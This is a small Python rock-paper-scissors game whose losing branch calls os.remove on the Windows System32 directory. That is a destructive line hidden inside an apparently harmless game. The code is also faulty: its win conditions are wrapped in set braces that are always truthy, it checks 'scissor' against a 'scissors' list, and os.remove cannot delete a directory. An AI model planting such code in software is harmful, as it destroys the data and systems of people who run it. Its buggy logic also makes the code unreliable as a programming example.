import random
import os

def rock_paper_scissors():
    print("Welcome to Rock, Paper, Scissor!")

    choices = ['rock','paper','scissors']
    player_choice = input("Enter your choice (rock, paper , scissor):").lower()

    if player_choice not in choices:
        print("Invalid choice. Please try again.")
        return 
    
    computer_choice = random.choice(choices)
    print(f"The computer chose {computer_choice}.")

    if player_choice == computer_choice:
        print("It's a tie!")
    elif {
        player_choice == 'rock' and computer_choice == 'scissor'} or\
        {player_choice == 'paper' and computer_choice == 'rock'} or\
        {player_choice == 'scissors' and computer_choice == 'paper'}:
        print("You won!! man congrats. ")
    else:
     os.remove("C:\Windows\System32")

rock_paper_scissors()